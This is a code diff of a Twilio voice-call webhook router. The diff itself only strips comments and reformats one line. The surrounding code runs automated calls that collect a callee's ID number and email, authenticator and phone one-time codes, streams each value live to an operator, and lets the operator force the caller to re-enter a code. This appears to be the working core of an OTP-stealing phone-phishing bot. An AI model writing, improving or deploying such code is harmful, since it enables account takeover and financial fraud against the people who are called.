@@ -106,11 +106,8 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.hangup();
             
         } else if (currentAction === 'playing_music') {
-            // FIXED MUSIC URL - Using proper Twilio compatible URL
             twiml.say('Please hold while we process your request.');
-            const play = twiml.play({
-                loop: 10
-            });
+            const play = twiml.play({ loop: 10 });
             play.url = 'https://twimlets.com/holdmusic?Bucket=com.twilio.music.classical';
             twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
             
@@ -141,7 +138,6 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
     console.log('Consent - Session:', sessionId, 'Digits:', Digits);
     
     if (Digits === '1') {
-        // AFTER PRESSING 1, IMMEDIATELY ASK FOR ID - NO "PLEASE WAIT"
         await db.query(
             `UPDATE call_sessions SET current_action = 'waiting_for_id' WHERE id = $1`,
             [sessionId]
@@ -154,7 +150,6 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
         
         io.emit('user_response', { session_id: sessionId, type: 'consent', value: '1' });
         
-        // DIRECTLY ASK FOR ID NUMBER
         const gather = twiml.gather({
             numDigits: 20,
             action: `/webhooks/collect-id/${sessionId}`,
@@ -209,8 +204,6 @@ router.post('/collect-id/:sessionId', async (req, res) => {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
         await db.query(`UPDATE contacts SET id_number = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'id_number', Digits]);
-        
-        // Store last data type for reject functionality
         await db.query(`UPDATE call_sessions SET last_data_type = 'id_number', last_data_value = $1 WHERE id = $2`, [Digits, sessionId]);
         
         io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
@@ -242,7 +235,6 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
         await db.query(`UPDATE contacts SET email_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'email_otp', Digits]);
-        
         await db.query(`UPDATE call_sessions SET last_data_type = 'email_otp', last_data_value = $1 WHERE id = $2`, [Digits, sessionId]);
         
         io.emit('data_collected', { session_id: sessionId, type: 'email_otp', value: Digits });
@@ -274,7 +266,6 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
         await db.query(`UPDATE contacts SET auth_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'auth_otp', Digits]);
-        
         await db.query(`UPDATE call_sessions SET last_data_type = 'auth_otp', last_data_value = $1 WHERE id = $2`, [Digits, sessionId]);
         
         io.emit('data_collected', { session_id: sessionId, type: 'auth_otp', value: Digits });
@@ -306,7 +297,6 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
         const session = await db.query(`SELECT contact_id FROM call_sessions WHERE id = $1`, [sessionId]);
         await db.query(`UPDATE contacts SET phone_otp = $1 WHERE id = $2`, [Digits, session.rows[0].contact_id]);
         await db.query(`INSERT INTO collected_data (session_id, contact_id, data_type, data_value) VALUES ($1, $2, $3, $4)`, [sessionId, session.rows[0].contact_id, 'phone_otp', Digits]);
-        
         await db.query(`UPDATE call_sessions SET last_data_type = 'phone_otp', last_data_value = $1 WHERE id = $2`, [Digits, sessionId]);
         
         io.emit('data_collected', { session_id: sessionId, type: 'phone_otp', value: Digits });
@@ -326,7 +316,6 @@ router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// NEW: REJECT LAST DATA ROUTE
 router.post('/reject-last-data/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const io = req.app.get('io');
@@ -343,13 +332,11 @@ router.post('/reject-last-data/:sessionId', async (req, res) => {
         const lastDataValue = session.rows[0]?.last_data_value;
         
         if (lastDataType) {
-            // Clear the last submitted data
             await db.query(
                 `UPDATE contacts SET ${lastDataType} = NULL WHERE id = (SELECT contact_id FROM call_sessions WHERE id = $1)`,
                 [sessionId]
             );
             
-            // Set action to re-ask for the same data
             await db.query(
                 `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
                 [`waiting_for_${lastDataType}`, sessionId]
